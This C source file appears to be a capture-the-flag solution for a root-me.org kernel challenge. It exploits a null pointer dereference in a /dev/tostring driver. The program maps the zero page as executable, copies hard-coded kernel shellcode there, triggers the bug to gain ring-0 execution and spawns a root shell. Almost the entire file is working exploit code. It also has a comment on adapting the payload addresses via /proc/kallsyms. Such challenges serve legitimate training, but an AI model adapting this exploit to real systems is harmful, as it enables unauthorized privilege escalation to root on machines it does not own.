/*
 * root-me.org: LinKern32 - Null pointer dereference challenge (fix)
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define __vsys_likely(q)	__builtin_expect(!!(q), 1)
#define __vsys_unlikely(q)	__builtin_expect(!!(q), 0)

int main(void) {
	int fd;
	ssize_t write_size;
	char *dummy_buf = "**********S";
	char *bug = "\x31\xc0\xb8\x41\x41\x41\x41\xff\xe0";
	// ini platform dan kernel dependent payload... sesuaikan dengan mesinnya
	// hint: /proc/kallsyms
	char *root = "\x31\xc0\xe8\xc9\x95\x08\xc1\xe8\x14\x93\x08\xc1\xc3";
	char *dummy_container[0x7a69];
	char *payload_container;

	printf("[*] Depend on buffer: %s\n", dummy_buf);
	printf("[*] Trying to open /dev/tostring in write-only mode.\n");

	fd = open( "/dev/tostring", O_WRONLY );

	if ( __vsys_unlikely(fd == -1) ) {
		fprintf(stderr, "[-] Failed to open /dev/tostring in write-only mode.\n");

		return ( -1 );
	}

	printf("[*] Trying to write arbitrary buffer into /dev/tostring.\n");

	write_size = write(fd, dummy_buf, strlen(dummy_buf));

	if ( write_size == -1 ) {
		fprintf(stderr, "[-] Failed to write data at /dev/tostring.\n");

		return ( -1 );
	}

	printf("[*] %u bytes of data has been written to /dev/string.\n", write_size);

	close(fd);

	printf("[*] Trying to map zero page.\n");

	payload_container = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if ( payload_container == (void *)MAP_FAILED ) {
		fprintf(stderr, "[-] Failed to map zero page.\n");

		return ( -1 );
	}

	printf("[*] Zero page mapped.\n");
	printf("[*] Now, copying payload into mapped zero page.\n");

	memcpy(payload_container, root, strlen(root));

	printf("[*] Current UID: %u\n", getuid());

	printf("[*] Trying to open /dev/tostring in read-only mode.\n");

	fd = open( "/dev/tostring", O_RDONLY );

	if ( __vsys_unlikely(fd == -1) ) {
		fprintf(stderr, "[-] Failed to open /dev/tostring in read-only mode.\n");

		return ( -1 );
	}

	printf("[*] Triggering null pointer bug.\n");

	read(fd, dummy_container, 1337);

	if ( !getuid() ) {
		printf("[*] Got ring0.\n");
		printf("[*] New UID: %u\n", getuid());
		printf("[*] Launching root shell.\n");

		execl("/bin/sh", "-c", NULL);
	}

	// shit that close() ...
	close(fd);

	return ( 0 );
}
